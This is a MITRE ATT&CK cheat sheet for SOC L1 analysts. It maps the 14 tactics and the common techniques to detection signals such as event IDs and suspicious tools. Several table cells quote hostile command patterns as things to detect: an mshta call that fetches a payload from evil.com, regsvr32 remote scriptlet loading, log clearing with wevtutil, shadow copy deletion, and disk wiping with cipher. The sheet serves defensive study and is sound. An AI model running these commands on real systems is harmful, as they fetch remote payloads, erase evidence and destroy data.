# MITRE ATT&CK Cheat Sheet for SOC Analysts

**Priority: P0 — Must know before L1 interview**

---

## ATT&CK Matrix: 14 Tactics (Left to Right = Attack Progression)

```
RECONNAISSANCE → RESOURCE DEVELOPMENT → INITIAL ACCESS → EXECUTION → PERSISTENCE 
→ PRIVILEGE ESCALATION → DEFENSE EVASION → CREDENTIAL ACCESS → DISCOVERY 
→ LATERAL MOVEMENT → COLLECTION → COMMAND AND CONTROL → EXFILTRATION → IMPACT
```

---

## TACTIC DEFINITIONS & KEY TECHNIQUES (L1 Focus)

### 1. RECONNAISSANCE (TA0043)
**Goal**: Gather target information
| Technique | ID | What to Look For |
|-----------|-----|------------------|
| Active Scanning | T1595 | Port scans, vulnerability scans, web crawlers |
| Phishing for Info | T1598 | Spearphishing with surveys, fake login pages |
| Search Open Technical Databases | T1596 | WHOIS, DNS, Shodan, Censys, GitHub dorks |

### 2. RESOURCE DEVELOPMENT (TA0042)
**Goal**: Build/buy infrastructure
| Technique | ID | What to Look For |
|-----------|-----|------------------|
| Acquire Infrastructure | T1583 | Domain registration, VPS, compromised hosts |
| Develop Capabilities | T1587 | Malware, exploits, tools |
| Obtain Capabilities | T1588 | Buy malware, rent C2, MaaS |

### 3. INITIAL ACCESS (TA0001) ⭐ HIGH L1 VISIBILITY
**Goal**: Get into the network
| Technique | ID | Detection Signals |
|-----------|-----|-------------------|
| **Phishing: Attachment** | T1566.001 | Email with .docm, .exe, .iso, .lnk; macro execution; WINWORD→PS |
| **Phishing: Link** | T1566.002 | Email with malicious URL; credential harvesting; MFA fatigue |
| **Valid Accounts** | T1078 | Stolen creds, default creds, credential stuffing, password spray |
| **External Remote Services** | T1133 | VPN, RDP, SSH, Citrix exposed to internet |
| **Exploit Public-Facing App** | T1190 | Web app attacks (SQLi, RCE), VPN vulns (CVE-2024-XXXX) |
| **Supply Chain** | T1195 | Compromised software updates, malicious packages |
| **Drive-by Compromise** | T1189 | Malicious website, exploit kit |

### 4. EXECUTION (TA0002) ⭐ HIGH L1 VISIBILITY
**Goal**: Run malicious code
| Technique | ID | Detection Signals |
|-----------|-----|-------------------|
| **Command & Scripting Interpreter** | T1059 | |
| &nbsp;&nbsp;PowerShell | T1059.001 | Encoded commands, download cradles, AMSI bypass, Script Block Logging (4104) |
| &nbsp;&nbsp;Windows Command Shell | T1059.003 | cmd.exe from Office, suspicious args |
| &nbsp;&nbsp;Unix Shell | T1059.004 | bash/sh from web server, cron |
| **Scheduled Task/Job** | T1053 | |
| &nbsp;&nbsp;Scheduled Task | T1053.005 | EventID 4698, schtasks, at.exe, COM handler |
| &nbsp;&nbsp;Cron | T1053.003 | crontab entries, /etc/cron* |
| **Service Execution** | T1569 | |
| &nbsp;&nbsp;Windows Service | T1569.002 | EventID 7045, sc.exe create, suspicious service paths |
| **User Execution** | T1204 | |
| &nbsp;&nbsp;Malicious File | T1204.002 | User opens .exe, .docm, .iso, .lnk |
| **Inter-Process Communication** | T1559 | |
| &nbsp;&nbsp;Dynamic Data Exchange | T1559.002 | DDE in Office, CMD from Excel |

### 5. PERSISTENCE (TA0003) ⭐ HIGH L1 VISIBILITY
**Goal**: Maintain access
| Technique | ID | Detection Signals |
|-----------|-----|-------------------|
| **Registry Run Keys** | T1547.001 | HKCU/HKLM\Run, RunOnce, Winlogon\Userinit |
| **Scheduled Task** | T1053.005 | EventID 4698/4702, unusual tasks, SYSTEM context |
| **Boot/Logon Autostart** | T1547 | |
| &nbsp;&nbsp;Shortcut Modification | T1547.009 | .lnk files in Startup, modified target |
| **Create Account** | T1136 | |
| &nbsp;&nbsp;Local Account | T1136.001 | EventID 4720, net user /add |
| &nbsp;&nbsp;Domain Account | T1136.002 | EventID 4720 on DC |
| **Valid Accounts** | T1078 | Account manipulation (4738), password changes (4723/4724) |
| **Server Software Component** | T1505 | |
| &nbsp;&nbsp;Web Shell | T1505.003 | .asp/.php/.jsp in web root, unusual process from w3wp.exe |
| **Hijack Execution Flow** | T1574 | |
| &nbsp;&nbsp;DLL Search Order Hijacking | T1574.001 | DLL in app dir, Sysmon EventID 7 |
| **Event Triggered Execution** | T1546 | |
| &nbsp;&nbsp;WMI Event Subscription | T1546.003 | EventID 19/20/21 Sysmon, __EventFilter, __EventConsumer |

### 6. PRIVILEGE ESCALATION (TA0004) ⭐ HIGH L1 VISIBILITY
**Goal**: Gain higher permissions
| Technique | ID | Detection Signals |
|-----------|-----|-------------------|
| **Abuse Elevation Control** | T1548 | |
| &nbsp;&nbsp;Bypass UAC | T1548.002 | EventID 4672 (SeDebug), COM elevation, fodhelper, eventvwr |
| **Access Token Manipulation** | T1134 | |
| &nbsp;&nbsp;Token Impersonation/Theft | T1134.001 | EventID 4672, make_token, impersonation |
| **Exploitation for Privilege Escalation** | T1068 | CVE exploits (PrintNightmare, Zerologon, CVE-2024-XXXX) |
| **Valid Accounts** | T1078 | Admin account use, service account abuse |

### 7. DEFENSE EVASION (TA0005) ⭐ HIGH L1 VISIBILITY
**Goal**: Avoid detection
| Technique | ID | Detection Signals |
|-----------|-----|-------------------|
| **Obfuscated Files/Info** | T1027 | |
| &nbsp;&nbsp;Command Obfuscation | T1027.010 | Base64, XOR, string concat, `-enc`, `-e`, `IEX` |
| &nbsp;&nbsp;Software Packing | T1027.002 | UPX, custom packers, entropy analysis |
| **Masquerading** | T1036 | |
| &nbsp;&nbsp;Rename System Utilities | T1036.003 | svchost.exe in Temp, explorer.exe in AppData, wrong path |
| &nbsp;&nbsp;Match Legitimate Name/Location | T1036.004 | msiexec.exe, dllhost.exe from suspicious parent |
| **Disable Security Tools** | T1562 | |
| &nbsp;&nbsp;Disable/Modify Tools | T1562.001 | Defender/EDR tampering, `Set-MpPreference`, WMI, reg keys |
| &nbsp;&nbsp;Disable Windows Event Logging | T1562.002 | EventID 1102, `wevtutil cl`, `auditpol` |
| **Impair Defenses** | T1562 | Safe mode boot, driver signing, firewall disable |
| **Indicator Removal** | T1070 | |
| &nbsp;&nbsp;File Deletion | T1070.004 | Sysmon EventID 23, `del`, `cipher /w` |
| **Process Injection** | T1055 | |
| &nbsp;&nbsp;Process Hollowing | T1055.012 | CreateProcess suspended, WriteProcessMemory, ResumeThread |
| &nbsp;&nbsp;Thread Execution Hijacking | T1055.003 | SuspendThread, SetThreadContext, ResumeThread |
| **Signed Binary Proxy Execution** | T1218 | |
| &nbsp;&nbsp;Rundll32 | T1218.011 | rundll32.exe from AppData, .dll with exports |
| &nbsp;&nbsp;Regsvr32 | T1218.010 | regsvr32.exe /s /n /u /i:http://... |
| &nbsp;&nbsp;Mshta | T1218.005 | mshta.exe http://evil.com/payload.hta |
| &nbsp;&nbsp;Certutil | T1140 | certutil.exe -decode / -urlcache / -verifyctl |

### 8. CREDENTIAL ACCESS (TA0006) ⭐ HIGH L1 VISIBILITY
**Goal**: Steal credentials
| Technique | ID | Detection Signals |
|-----------|-----|-------------------|
| **OS Credential Dumping** | T1003 | |
| &nbsp;&nbsp;LSASS Memory | T1003.001 | EventID 10 (Sysmon) GrantedAccess=0x1010, Mimikatz, procdump, comsvcs.dll |
| &nbsp;&nbsp;NTDS | T1003.003 | EventID 4662 (DCSync), ntdsutil, vssadmin |
| &nbsp;&nbsp;Cached Credentials | T1003.005 | Reg export HKLM\SECURITY\Cache |
| **Network Sniffing** | T1040 | Promiscuous mode, Wireshark, raw sockets |
| **Input Capture** | T1056 | Keyloggers, clipboard, GetAsyncKeyState |
| **Brute Force** | T1110 | |
| &nbsp;&nbsp;Password Guessing | T1110.001 | Many 4625 single user |
| &nbsp;&nbsp;Password Spraying | T1110.003 | Few 4625 many users |
| &nbsp;&nbsp;Credential Stuffing | T1110.004 | Breach creds against target |
| **Forced Authentication** | T1187 | PetitPotam, printer bug, WebDAV |
| **Steal/Forge Kerberos Tickets** | T1558 | |
| &nbsp;&nbsp;Golden Ticket | T1558.001 | 20yr TGT, SID history injection, krbtgt compromise |
| &nbsp;&nbsp;Silver Ticket | T1558.002 | Forged TGS, service account hash |
| &nbsp;&nbsp;Kerberoasting | T1558.003 | Many 4769 RC4 for SPNs |
| &nbsp;&nbsp;AS-REP Roasting | T1558.004 | 4768/4771 for no-preauth accounts |

### 9. DISCOVERY (TA0007) ⭐ HIGH L1 VISIBILITY
**Goal**: Learn environment
| Technique | ID | Detection Signals |
|-----------|-----|-------------------|
| **System Info Discovery** | T1082 | `systeminfo`, `hostname`, `whoami`, `ipconfig` |
| **Network Service Discovery** | T1046 | Port scans, `net view`, `arp -a`, `nbtscan` |
| **Remote System Discovery** | T1018 | `net view /domain`, AD queries, BloodHound/SharpHound |
| **Account Discovery** | T1087 | |
| &nbsp;&nbsp;Local Account | T1087.001 | `net user`, `whoami /groups` |
| &nbsp;&nbsp;Domain Account | T1087.002 | `net user /domain`, `Get-ADUser`, LDAP queries |
| **Permission Groups Discovery** | T1069 | `net localgroup administrators`, `Get-ADGroupMember` |
| **File/Directory Discovery** | T1083 | `dir`, `ls`, `Get-ChildItem`, search for sensitive files |
| **System Network Config** | T1016 | `ipconfig /all`, `route print`, `netstat -ano` |
| **Browser Bookmark Discovery** | T1217 | Browser SQLite databases |

### 10. LATERAL MOVEMENT (TA0008) ⭐ HIGH L1 VISIBILITY
**Goal**: Move through network
| Technique | ID | Detection Signals |
|-----------|-----|-------------------|
| **Remote Services** | T1021 | |
| &nbsp;&nbsp;SMB/Windows Admin Shares | T1021.002 | EventID 5140 (C$, ADMIN$), PsExec, smbexec, winexe |
| &nbsp;&nbsp;Remote Desktop Protocol | T1021.001 | EventID 4624 Type 10, RDP logs, mstsc |
| &nbsp;&nbsp;SSH | T1021.004 | SSH logs, authorized_keys, ssh-agent |
| &nbsp;&nbsp;WinRM | T1021.006 | EventID 4624 Type 3 (WinRM), port 5985/5986, `Enter-PSSession` |
| **Lateral Tool Transfer** | T1570 | SMB copy, `copy \\host\C$\temp\tool.exe`, PowerShell remoting |
| **Pass the Hash** | T1550.002 | NTLM auth (Type 3) from unexpected host, sekurlsa::pth |
| **Pass the Ticket** | T1550.003 | Kerberos ticket injection, Rubeus ptt |
| **Exploitation of Remote Services** | T1210 | EternalBlue, SMBGhost, PrintNightmare lateral |

### 11. COLLECTION (TA0009)
**Goal**: Gather data of interest
| Technique | ID | Detection Signals |
|-----------|-----|-------------------|
| **Data from Local System** | T1005 | File access, staging directories, compression |
| **Data from Network Shares** | T1039 | SMB access to file servers, large reads |
| **Data from Cloud Storage** | T1530 | S3/Blob/Drive API calls, rclone, awscli |
| **Email Collection** | T1114 | MAPI, EWS, Graph API, Outlook PST export |
| **Clipboard Data** | T1115 | `Get-Clipboard`, clipboard monitoring |
| **Screen Capture** | T1113 | `PrintScreen`, screenshot tools, RDP cache |
| **Archive Collected Data** | T1560 | |
| &nbsp;&nbsp;Archive via Utility | T1560.001 | 7z, WinRAR, tar, gzip, compress.exe, makecab |

### 12. COMMAND & CONTROL (TA0011) ⭐ HIGH L1 VISIBILITY
**Goal**: Communicate with controlled systems
| Technique | ID | Detection Signals |
|-----------|-----|-------------------|
| **Application Layer Protocol** | T1071 | |
| &nbsp;&nbsp;Web Protocols (HTTP/HTTPS) | T1071.001 | Beaconing, POST/GET to C2, JA3, domain fronting |
| &nbsp;&nbsp;DNS | T1071.004 | DNS tunneling, TXT/CNAME/MX queries, high entropy |
| &nbsp;&nbsp;Mail Protocols | T1071.003 | SMTP/IMAP/POP3 C2 (rare) |
| **Proxy** | T1090 | |
| &nbsp;&nbsp;Internal Proxy | T1090.001 | Jump hosts, pivot, port forwarding |
| &nbsp;&nbsp;External Proxy | T1090.002 | Tor, VPN, compromised VPS |
| **Protocol Tunneling** | T1572 | SSH tunneling, DNS tunneling, HTTP tunneling |
| **Non-Standard Port** | T1571 | C2 on 8080, 8443, 443 (non-web process) |
| **Encrypted Channel** | T1573 | TLS, custom crypto, certificate pinning |
| **Dynamic Resolution** | T1568 | |
| &nbsp;&nbsp;Fast Flux DNS | T1568.001 | Rapid IP rotation, low TTL |
| &nbsp;&nbsp;Domain Generation Algorithms | T1568.002 | Algorithmic domains, high entropy, NXDOMAIN spikes |
| **Ingress Tool Transfer** | T1105 | Certutil, bitsadmin, PowerShell, wget, curl, scp |

### 13. EXFILTRATION (TA0010)
**Goal**: Steal data
| Technique | ID | Detection Signals |
|-----------|-----|-------------------|
| **Exfiltration Over C2 Channel** | T1041 | Same channel as C2, data in HTTP/DNS |
| **Exfiltration Over Web Service** | T1567 | Cloud APIs (S3, Drive, Dropbox), rclone |
| **Exfiltration Over Alternative Protocol** | T1048 | |
| &nbsp;&nbsp;Exfiltration Over DNS | T1048.003 | DNS tunneling, large TXT responses |
| **Scheduled Transfer** | T1029 | Timed uploads, cron jobs |
| **Automated Exfiltration** | T1020 | Scripts, tools, scheduled tasks |
| **Data Transfer Size Limits** | T1030 | Chunked uploads, compression |

### 14. IMPACT (TA0040)
**Goal**: Manipulate, interrupt, destroy
| Technique | ID | Detection Signals |
|-----------|-----|-------------------|
| **Data Encrypted for Impact** | T1486 | Ransomware: mass file encryption, .locked, ransom notes, vssadmin delete shadows |
| **Data Destruction** | T1485 | Wiper malware, `del /s /q`, `cipher /w`, disk overwrite |
| **Service Stop** | T1489 | `net stop`, service disable, ransomware killing backups |
| **Defacement** | T1491 | Web content modification, index.html replace |
| **Firmware Corruption** | T1495 | BIOS/UEFI modification, BadUSB |
| **Resource Hijacking** | T1496 | Cryptominers: high CPU, mining pools, stratum protocol |
| **Account Access Removal** | T1531 | Account deletion, password change, group removal |

---

## L1 PRIORITY TECHNIQUES (Must Recognize On Sight)

| Technique | ID | Why L1 Must Know |
|-----------|-----|------------------|
| Phishing Attachment/Link | T1566.001/.002 | Most common initial access |
| Valid Accounts | T1078 | Credential theft, reuse |
| PowerShell | T1059.001 | #1 execution vector |
| Scheduled Task | T1053.005 | #1 persistence |
| Registry Run Keys | T1547.001 | Common persistence |
| LSASS Dumping | T1003.001 | Credential theft enabler |
| Kerberoasting | T1558.003 | Service account risk |
| Pass the Hash | T1550.002 | Lateral movement |
| SMB/Admin Shares | T1021.002 | Lateral movement |
| RDP | T1021.001 | Remote access abuse |
| Web Protocols (C2) | T1071.001 | C2 detection |
| DNS Tunneling | T1071.004 | Covert C2/exfil |
| Data Encrypted (Ransomware) | T1486 | Highest impact |
| Obfuscation (Base64) | T1027.010 | PowerShell evasion |
| Masquerading | T1036.003 | LOLBin, fake svchost |
| Disable Security Tools | T1562.001 | Defense evasion |
| Ingress Tool Transfer | T1105 | Tool staging |
| Archive Collected Data | T1560.001 | Exfil prep |

---

## QUICK MITRE MAPPING REFERENCE

```
PHISHING EMAIL → T1566.001/.002 (Initial Access)
   ↓
MACRO/SCRIPT EXECUTES → T1059.001/.003 (Execution)
   ↓
DOWNLOAD PAYLOAD → T1105 (Ingress Tool Transfer) + T1027.010 (Obfuscation)
   ↓
PERSISTENCE: RUN KEY / TASK → T1547.001 / T1053.005
   ↓
CREDENTIAL THEFT: LSASS → T1003.001
   ↓
LATERAL: SMB/RDP/PsExec → T1021.002 / T1021.001 / T1550.002
   ↓
C2: HTTPS BEACON → T1071.001
   ↓
EXFIL: COMPRESS + UPLOAD → T1560.001 + T1041
   ↓
RANSOMWARE: ENCRYPT → T1486 + T1490 (Inhibit Recovery)
```

---

## MITRE NAVIGATION TIPS

| Resource | URL |
|----------|-----|
| **MITRE ATT&CK Matrix (Enterprise)** | https://attack.mitre.org/matrices/enterprise/ |
| **Technique Search** | https://attack.mitre.org/techniques/enterprise/ |
| **Group Profiles** | https://attack.mitre.org/groups/ |
| **Software/Malware** | https://attack.mitre.org/software/ |
| **Mitigations** | https://attack.mitre.org/mitigations/enterprise/ |
| **Data Sources** | https://attack.mitre.org/datasources/ |

### Navigator (Heatmaps)
- https://mitre-attack.github.io/attack-navigator/
- Layer: Enterprise → Create custom heatmaps for your detections

---

## ONE-PAGE PRINT VERSION

```
MITRE ATT&CK — SOC L1 QUICK REFERENCE
======================================

14 TACTICS (in order):
1. RECONNAISSANCE (TA0043)           8. CREDENTIAL ACCESS (TA0006)
2. RESOURCE DEVELOPMENT (TA0042)     9. DISCOVERY (TA0007)
3. INITIAL ACCESS (TA0001) ⭐       10. LATERAL MOVEMENT (TA0008) ⭐
4. EXECUTION (TA0002) ⭐            11. COLLECTION (TA0009)
5. PERSISTENCE (TA0003) ⭐          12. COMMAND & CONTROL (TA0011) ⭐
6. PRIVILEGE ESCALATION (TA0004) ⭐ 13. EXFILTRATION (TA0010)
7. DEFENSE EVASION (TA0005) ⭐      14. IMPACT (TA0040)

⭐ = HIGH L1 VISIBILITY (you'll see alerts for these)

MUST-KNOW TECHNIQUES (memorize ID + name):
T1566.001  Phishing Attachment          T1003.001  LSASS Memory Dump
T1566.002  Phishing Link                T1558.003  Kerberoasting
T1078      Valid Accounts               T1550.002  Pass the Hash
T1059.001  PowerShell                   T1021.002  SMB/Admin Shares
T1053.005  Scheduled Task               T1021.001  RDP
T1547.001  Registry Run Keys            T1071.001  Web Protocols (C2)
T1027.010  Command Obfuscation          T1071.004  DNS Tunneling
T1036.003  Masquerading                 T1105      Ingress Tool Transfer
T1562.001  Disable Security Tools       T1560.001  Archive Collected Data
T1218.011  Rundll32 (LOLBin)            T1486      Data Encrypted (Ransomware)
T1490      Inhibit Recovery (VSS del)

DETECTION MAPPING:
Phishing → T1566 → Email security, user report
Macro/PS → T1059 → EDR process, 4688, 4104
Download → T1105 → EDR network, proxy, DNS
Persist → T1547/T1053 → 4698, 4702, Run keys
Creds → T1003 → Sysmon 10, 4624 Type 3 NTLM
Lateral → T1021 → 5140 (C$), 4624 Type 10
C2 → T1071 → Beaconing, JA3, DNS anomalies
Exfil → T1041/T1048 → Large outbound, DNS tunneling
Ransom → T1486 → Mass file changes, VSS delete

NAVIGATOR: https://mitre-attack.github.io/attack-navigator/
MATRIX: https://attack.mitre.org/matrices/enterprise/
```